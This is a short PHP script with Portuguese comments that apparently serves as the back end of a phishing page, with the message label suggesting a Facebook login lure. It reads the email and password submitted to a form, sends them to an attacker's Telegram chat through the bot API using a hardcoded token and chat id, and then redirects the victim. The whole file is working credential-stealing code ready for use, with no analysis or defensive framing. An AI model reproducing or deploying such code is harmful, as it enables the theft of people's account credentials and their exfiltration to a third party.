<?php

// Dados do formulário (substitua com os nomes dos campos do seu formulário)
$email = $_POST["email"];
$senha = $_POST["password"];

// Verifica se o e-mail e a senha foram fornecidos
if (!empty($email) && !empty($senha)) {
    // Agora, envie os dados para o seu chat do Telegram
    $botToken = '6158400466:AAEUs12kCvMb0TgzUSmtIVqXVtPVknqxXFY';
    $chatId = '6798832266';

    $mensagem = urlencode("face e-mail: $email\nsenha: $senha");
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";

    $response = @file_get_contents($url);

    if ($response !== false) {
        // Redireciona o usuário para outra página
        header('Location: dudusi/index.html');
        exit; // Certifique-se de que a execução do script pare aqui para que o redirecionamento funcione corretamente
    } else {
        echo "Erro ao enviar os dados para o chat do Telegram.";
    }
} else {
    echo "Por favor, forneça um e-mail e uma senha.";
}

?>
